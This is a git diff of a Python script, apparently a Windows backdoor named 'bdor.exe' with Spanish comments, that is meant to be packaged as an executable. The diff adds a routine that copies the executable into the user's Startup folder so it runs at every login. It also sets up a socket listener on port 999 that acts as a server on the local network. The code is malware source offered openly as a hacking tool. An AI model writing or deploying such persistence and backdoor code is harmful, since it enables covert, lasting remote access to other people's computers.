@@ -1,3 +1,7 @@
+
+# rama para uso en ejecutables (.exe) NO MEZCLAR CON OTRAS RAMAS
+# este es el script que se debe pasar a exe, no olvidar
+
 import subprocess
 import socket
 import os
@@ -9,6 +13,17 @@ from re import match
 # pensado solo para ejecucion dentro de la red local, el equipo en este caso es el que va a actuar como server
 # no esta preparado para escuchar fuera de la red privada, no recomiendo
 # "Estamos hack" - Autor: Matias Urbaneja (Urb@n) - # https://github.com/Urban20
+
+nombre_exe = 'bdor.exe' # nombre que tendra el ejecutable, debe coincidir o la operacion falla
+
+def mover_dir(): # mover ejecutable al startup
+    'intenta mover el ejecutable a la ruta de startup de windows, si falla imprime el error en consola y el codigo continua'
+    try:
+        os.rename(f'{os.getcwd()}\\{nombre_exe}',f'{os.environ.get('USERPROFILE')}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{nombre_exe}')
+
+    except Exception as e: print(f'hubo un error al mover el exe: {e}') # para verlo en consola en caso de que no ande (pensado en entornos de prueba)
+
+
 
 def IPV4():
     'intenta obtener la direccion ipv4 de la maquina'
@@ -65,6 +80,8 @@ def main():
             n=1
 
 if __name__ == '__main__' and platform.system() == 'Windows':
+    mover_dir()
+
     puerto = 999
     ip = IPV4()
     s = socket.socket()
